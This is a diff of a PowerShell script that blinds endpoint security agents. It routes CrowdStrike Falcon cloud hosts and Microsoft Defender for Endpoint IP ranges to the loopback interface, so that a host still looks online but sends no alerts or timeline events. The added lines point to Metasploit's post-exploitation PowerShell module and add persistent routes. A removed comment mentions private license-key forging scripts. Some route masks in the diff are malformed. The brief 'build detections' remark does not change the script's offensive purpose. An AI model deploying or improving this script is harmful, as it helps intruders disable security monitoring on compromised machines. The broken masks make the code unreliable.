@@ -2,10 +2,12 @@
 # You'll need to add your own defender links to the target_URLs, IP Addressing blocks work suuuuper easily, and can neuter visibility such that a device reports active, but can't report timeline events or alerts.
 # You'll also need to add your own addresses for other VPNs, but all-in-all it's really easy to work, and verified to work. 
 # Test on your own network to build detections w/ whatever EDR toolsets you have.  Powershell vs. route methods work.
+# Use with metasploit: modules/post/windows/manage/exec_powershell.rb
+
 
 #CS IP Links https://www.dell.com/support/kbdoc/en-lv/000177899/crowdstrike-falcon-sensor-system-requirements
 #CS IP Links https://github.com/simonsigre/crowdstrike_falcon-ipaddresses/blob/master/cs_falcon_commercial_cloud
-# This is not illegal, I just read this: https://www.justice.gov/jm/jm-9-48000-computer-fraud, however some of my license key scripts to artificially extend/create keys will have to remain private. Sorry m8s
+
 $target_URLs = @("ts01-gyr-maverick.cloudsink.net", "ts01-b.cloudsink.net", "lfodown01-gyr-maverick.cloudsink.net", "lfodown01-b.cloudsink.net")
 $Regex_Lookups = @()#Fill this in with sites you want to block.
 $IPs =@() #fill this with IPs you know you want to block.
@@ -32,6 +34,12 @@ $InterfaceAlias = "*Loopback*"
 route /f
 # Get the loopback interface index
 $InterfaceIndex = (Get-NetIPInterface | Where-Object {$_.InterfaceAlias -like $InterfaceAlias}).InterfaceIndex
+
+#Microsoft defender for Endpoint IP ranges. (Source: Talos + Procmon)
+route add -p 40.0.0.0 mask 255.0.0.0.0 0.0.0.0 if $InterfaceIndex[0]
+route add -p 52.160.0.0 mask 255.224.0.0 0.0.0.0 if $InterfaceIndex[0]
+route add -p 20.0.0.0 mask 255.0.0.0.0 0.0.0.0 if $InterfaceIndex[0]
+
 while ($true){
     $IPs | ForEach-Object{
         $meesa = $_ + "/32"
